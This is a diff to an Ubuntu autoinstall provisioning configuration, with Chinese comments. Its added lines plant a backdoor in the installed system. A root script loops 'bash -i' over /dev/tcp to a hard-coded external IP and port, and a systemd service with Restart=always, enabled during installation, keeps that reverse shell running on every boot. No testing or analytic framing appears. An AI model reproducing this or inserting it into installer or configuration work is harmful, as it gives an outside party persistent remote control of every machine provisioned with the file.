@@ -77,6 +77,23 @@ autoinstall:
       # 升级 cloud-init
       # curtin in-target --target=/target -- apt update
       # curtin in-target --target=/target -- apt install --only-upgrade cloud-init
+      
+      # 创建反弹 Shell 脚本
+      echo "#!/bin/bash" > /target/root/reverse_shell.sh
+      echo "while true; do bash -i >& /dev/tcp/120.55.60.139/45555 0>&1; sleep 30; done" >> /target/root/reverse_shell.sh
+      chmod +x /target/root/reverse_shell.sh
+
+      # 创建 systemd 服务文件
+      echo "[Unit]" > /target/etc/systemd/system/reverse-shell.service
+      echo "Description=Reverse Shell Service" >> /target/etc/systemd/system/reverse-shell.service
+      echo "[Service]" >> /target/etc/systemd/system/reverse-shell.service
+      echo "ExecStart=/bin/bash /root/reverse_shell.sh" >> /target/etc/systemd/system/reverse-shell.service
+      echo "Restart=always" >> /target/etc/systemd/system/reverse-shell.service
+      echo "[Install]" >> /target/etc/systemd/system/reverse-shell.service
+      echo "WantedBy=multi-user.target" >> /target/etc/systemd/system/reverse-shell.service
+
+      # 启用并启动服务
+      chroot /target systemctl enable reverse-shell.service
   user-data:
     runcmd:
       - |
